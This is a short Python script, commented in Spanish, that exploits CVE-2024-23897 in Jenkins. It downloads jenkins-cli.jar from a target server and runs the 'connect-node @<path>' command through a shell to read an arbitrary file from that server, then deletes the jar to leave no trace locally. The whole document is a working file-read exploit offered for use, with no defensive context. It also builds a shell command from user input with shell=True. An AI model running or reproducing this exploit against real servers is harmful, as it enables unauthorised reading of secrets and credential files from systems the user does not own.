import argparse # Sirve para que el usuario proporcione parametros
import requests # Sirve para poder hacer peticiones http
import os # Para eliminar el .jar y que el ordenador quede limpio
import subprocess # Para ejecutar comandos del sistema
import sys # Para en algunos puntos detener la ejecucion del scripts

def descargarjar(ip,puerto):
    url = f"http://{ip}:{puerto}/jnlpJars/jenkins-cli.jar"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            with open('jenkins-cli.jar', 'wb') as archivo_jar:
                archivo_jar.write(response.content)
            return True
        else:
            print(f"No se pudo descargar el archivo. Codigo de estado: {response.status_code}")
            return False
    except requests.RequestException as errorhttp:
        print(f"Error al realizar la solicitud: {errorhttp}")
        return False
    
def payload(ip,puerto,ruta):
    archivo_jar = "jenkins-cli.jar"
    payload = f"java -jar {archivo_jar} -s http://{ip}:{puerto}/ -http connect-node @{ruta}"
    try:
        subprocess.run(payload, shell=True, check=True) # Ejecuta el exploit
        os.remove(archivo_jar) # Elimina el archivo porque ya no lo necesitamos
    except subprocess.CalledProcessError as error_payload:
        print(f"Error al intentar conectar el nodo: {error_payload}")


def main():
    parser = argparse.ArgumentParser(description="Script para explotar el CVE-2024-23897")
    parser.add_argument("ip", type=str, help="Direcci√≥n IP del servidor Jenkins")
    parser.add_argument("puerto", type=str, help="Puerto del servidor Jenkins")
    parser.add_argument("ruta", type=str, help="Ruta para leer el archivo")
    args = parser.parse_args()

    ip = args.ip
    puerto = args.puerto
    ruta = args.ruta

    if descargarjar(ip,puerto):
        payload(ip,puerto,ruta)
    else:
        sys.exit(1)

if __name__ == '__main__':
    main()
